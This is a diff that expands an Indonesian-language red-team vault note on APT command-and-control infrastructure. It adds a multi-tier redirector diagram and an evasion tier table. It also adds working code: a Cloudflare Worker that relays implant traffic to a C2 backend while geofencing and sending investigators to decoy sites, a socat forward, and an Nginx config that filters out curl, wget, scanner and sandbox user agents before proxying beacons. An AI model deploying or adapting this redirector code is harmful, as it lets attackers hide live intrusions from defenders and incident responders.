@@ -1,24 +1,171 @@
 ---
-title: "APT C2 Infrastructure"
+title: "APT C2 Infrastructure — Stealth Redirection and Evasion"
 tags:
   - apt
   - c2
   - red-team
   - command-control
+  - evasion
+  - network-security
 aliases:
   - "apt-c2-infrastructure"
 created: "2026-07-19"
 updated: "2026-07-19"
-status: seedling
+status: operational
 ---
 
-> C2 infrastructure untuk APT-level red team. Melengkapi c2-server-fix dan advanced-red-team-infrastructure-fix.
+> [!abstract] Ringkasan & Hubungan ke Vault
+> Infrastruktur Command & Control (C2) tingkat APT (_Advanced Persistent Threat_) dirancang untuk meminimalkan deteksi di level jaringan dan melindungi server backend asli penyerang dari penyitaan (_takedown_). Catatan ini melengkapi pembahasan [[apt-c2-infrastructure]] dan [[blueteam-detection-matrix]].
 
-## Tiers
+## Daftar Isi
 
-| Level          | Evasion                | Protocol         | Hosting                |
-| -------------- | ---------------------- | ---------------- | ---------------------- |
-| L1 - Basic     | None                   | HTTP/S           | VPS (public)           |
-| L2 - Stealth   | Domain fronting, CDN   | HTTPS, WebSocket | CloudFront, CF Workers |
-| L3 - Modular   | Redirector chain       | HTTPS + DNS      | Multi-region VPS       |
-| L4 - APT-grade | CDN + redirector + ROT | Multi-protocol   | Compromised legit      |
+1. [Arsitektur C2 Multi-Tier](#1-arsitektur-c2-multi-tier)
+2. [Tiers Evasion & Protokol](#2-tiers-evasion--protokol)
+3. [Domain Fronting & Serverless Redirectors (Cloudflare Workers)](#3-domain-fronting--serverless-redirectors-cloudflare-workers)
+4. [Implementasi Konfigurasi Redirector (Nginx mod_rewrite & socat)](#4-implementasi-konfigurasi-redirector-nginx-mod_rewrite--socat)
+5. [Koneksi ke Vault](#5-koneksi-ke-vault)
+
+---
+
+## 1. Arsitektur C2 Multi-Tier
+
+Infrastruktur Red Team/APT modern tidak pernah menghubungkan agen/implants (_victim host_) langsung ke server C2 utama (_Backend C2_). Kami menggunakan rantai pengalihan (_redirectors_) untuk menyembunyikan identitas backend.
+
+```
+                  Victim Host (Implant)
+                           │
+                           ▼ (HTTPS Traffic ke Domain Legit)
+                ┌─────────────────────┐
+                │   CDN (Cloudflare)  │  (Domain Fronting / CDN layer)
+                └──────────┬──────────┘
+                           │
+                           ▼ (Forwarded Request)
+                ┌─────────────────────┐
+                │    L1 Redirector    │  (socat / Nginx reverse proxy di cloud VPS)
+                └──────────┬──────────┘
+                           │
+                           ▼ (Filtered Traffic)
+                ┌─────────────────────┐
+                │    L2 Redirector    │  (Firewall IP filtering & Geofencing)
+                └──────────┬──────────┘
+                           │
+                           ▼ (IP-Sec Tunnel / WireGuard)
+                ┌─────────────────────┐
+                │  Backend C2 Server  │  (Cobalt Strike / Sliver / Havoc)
+                └─────────────────────┘
+```
+
+---
+
+## 2. Tiers Evasion & Protokol
+
+APT C2 membagi infrastruktur ke dalam beberapa level kerahasiaan berdasarkan fungsi operasional:
+
+| Level Tier | Nama              | Protokol Utama          | Mekanisme Evasion                                    | Target Penggunaan                                   |
+| ---------- | ----------------- | ----------------------- | ---------------------------------------------------- | --------------------------------------------------- |
+| **Tier 1** | _Staging/Payload_ | HTTP/HTTPS              | Tidak ada / Minimal                                  | Pengiriman awal file dropper (_staging stage_)      |
+| **Tier 2** | _Interactive_     | HTTPS / WebSockets      | CDN proxy, Domain Fronting, HTTP Header Modification | Operasi interaktif harian (eksekusi perintah cepat) |
+| **Tier 3** | _Long-Term_       | DNS (TXT records), ICMP | Slow beaconing (misal: kirim sinyal tiap 24 jam)     | Pertahanan persistensi (jika Tier 2 diblokir)       |
+| **Tier 4** | _Out-of-Band_     | Custom TCP/UDP port     | Obfuscated protocols, compromised legit servers      | Jalur darurat _backup access_                       |
+
+---
+
+## 3. Domain Fronting & Serverless Redirectors (Cloudflare Workers)
+
+**Domain Fronting** adalah teknik yang menyembunyikan tujuan asli request HTTPS dengan memanfaatkan CDN. Saat request dikirim, alamat tujuan di SNI (_Server Name Indication_) TLS menunjuk ke domain terpercaya yang di-host di CDN yang sama, namun header `Host` HTTP di dalam terowongan terenkripsi menunjuk ke server backend penyerang.
+
+### 3.1 Serverless Redirector menggunakan Cloudflare Workers
+
+Penyerang modern memanfaatkan arsitektur serverless CDN (seperti Cloudflare Workers) sebagai redirector karena IP CDN selalu dipercaya oleh filter firewall perusahaan.
+
+```javascript
+// Contoh Cloudflare Worker sebagai L1 Redirector
+const BACKEND_C2 = "https://c2-backend.secured-network.xyz"
+
+async function handleRequest(request) {
+  const url = new URL(request.url)
+
+  // Modifikasi request sebelum dikirim ke backend C2
+  const modifiedHeaders = new Headers(request.headers)
+  modifiedHeaders.set("X-Forwarded-For-Proxy", "CF-Worker-L1")
+  modifiedHeaders.set("Host", "c2-backend.secured-network.xyz")
+
+  // Analisis Geofencing sederhana: Hanya izinkan target dari negara spesifik (misal: Indonesia/ID)
+  const country = request.cf ? request.cf.country : ""
+  if (country !== "ID") {
+    // Umpan balik palsu: Alihkan crawler/investigator ke situs berita umum
+    return Response.redirect("https://www.detik.com", 302)
+  }
+
+  const modifiedRequest = new Request(BACKEND_C2 + url.pathname + url.search, {
+    method: request.method,
+    headers: modifiedHeaders,
+    body: request.method !== "GET" && request.method !== "HEAD" ? await request.blob() : null,
+  })
+
+  return fetch(modifiedRequest)
+}
+
+addEventListener("fetch", (event) => {
+  event.respondWith(handleRequest(event.request))
+})
+```
+
+---
+
+## 4. Implementasi Konfigurasi Redirector (Nginx mod_rewrite & socat)
+
+### 4.1 Redirector Sederhana menggunakan `socat`
+
+Mekanisme tercepat untuk membelokkan lalu lintas TCP/UDP tanpa memproses layer HTTP:
+
+```bash
+# Pengalihan port 443 dari L1 VPS langsung ke Backend C2 (IP: 10.0.1.50)
+socat TCP4-LISTEN:443,fork,reuseaddr TCP4:10.0.1.50:443
+```
+
+_Kelemahan_: Alamat IP asli dari korban akan terlihat di backend sebagai alamat IP dari L1 Redirector, bukan IP asli korban.
+
+### 4.2 Nginx Smart Redirector (HTTP Filtering & Evasion)
+
+Menggunakan aturan _mod_rewrite_ di Nginx untuk menyaring investigator siber atau sistem analisis otomatis (sandboxing antivirus) dengan memeriksa pola User-Agent dan URI sebelum mengirimkan request ke backend C2.
+
+```nginx
+# Konfigurasi /etc/nginx/sites-available/c2-redirector
+server {
+    listen 80;
+    server_name proxy.legit-firm.xyz;
+
+    location / {
+        # 1. Geofencing/IP filtering fallback
+        # Jika bukan target, kirim ke situs lain
+        proxy_set_header Host $host;
+
+        # 2. Filter User Agent Antivirus Sandbox & Blue Team
+        if ($http_user_agent ~* (wget|curl|python|nikto|nessus|microfocus|shodan)) {
+            return 302 https://www.microsoft.com;
+        }
+
+        # 3. Validasi URI Endpoint C2 beacon (hanya teruskan jika URI cocok dengan profil C2)
+        if ($uri ~* ^/(news|assets|static|js)/.*$) {
+            # Teruskan ke backend C2 asli
+            proxy_pass http://10.0.1.50:8080;
+            break;
+        }
+
+        # Jika tidak cocok dengan pola endpoint C2, arahkan ke dummy website
+        return 302 https://www.wikipedia.org;
+    }
+}
+```
+
+---
+
+## 5. Koneksi ke Vault
+
+| Catatan                         | Hubungan                                                                   |
+| ------------------------------- | -------------------------------------------------------------------------- |
+| [[blueteam-detection-matrix]]   | Metode tim biru mendeteksi sinyal aneh/beaconing dari C2.                  |
+| [[network-security]]            | Penjelasan routing, TLS Termination, dan BGP Hijacking.                    |
+| [[incident-response-framework]] | Menelusuri log Nginx redirector saat investigasi pembobolan infrastruktur. |
+| [[unified-threat-ontology]]     | Penempatan C2 pada tingkat Layer 3 (Network) & Layer 7 (Application).      |
